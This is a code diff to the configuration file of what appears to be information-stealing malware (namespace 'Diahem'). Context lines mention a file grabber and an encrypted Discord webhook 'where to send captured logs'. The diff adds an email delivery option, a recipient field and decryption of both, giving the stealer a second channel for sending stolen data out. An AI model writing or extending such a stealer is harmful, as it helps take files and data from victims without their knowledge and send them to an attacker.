@@ -35,10 +35,22 @@ namespace Diahem
         // File grabber:
         public static string GrabberModule = "1";
 
+        // Delivery method: "discord" or "email"
+        public static string DeliveryType = "discord";
+
+        // Recipient Email for email delivery
+        public static string EmailRecipient = "";
+
         // Discord Webhook where to send captured logs
         public static string Webhook =
             "ENCRYPTED:Z6wDfv2IxQbZmN3X8dQv3iFnArjC+Xh8XT65VFx/ST+IEkNK2bfVjSZEjgv86uAD/wFiJ8LmuzQ6Am+RfjVolqZDhoeN2SBIh5eBJGML0Stttb0eAAyFuBRpZEAZ27wnguf+Gtzue156grs+16rnt7ywK1gaGK/G4ivBsBpussc=";
 #elif RELEASE
+        // Delivery method: "discord" or "email"
+        public static string DeliveryType = "--- DeliveryType ---";
+
+        // Recipient Email for email delivery
+        public static string EmailRecipient = "--- EmailRecipient ---";
+
         // Debug mode (write all exceptions to file)
         public static string DebugMode = "--- Debug ---";
 
@@ -153,6 +165,9 @@ namespace Diahem
         // Decrypt config values
         public static void Init()
         {
+            DeliveryType = StringsCrypt.DecryptConfig(DeliveryType);
+            EmailRecipient = StringsCrypt.DecryptConfig(EmailRecipient);
+
             // Decrypt discord webhook
             Webhook = StringsCrypt.DecryptConfig(Webhook);
 
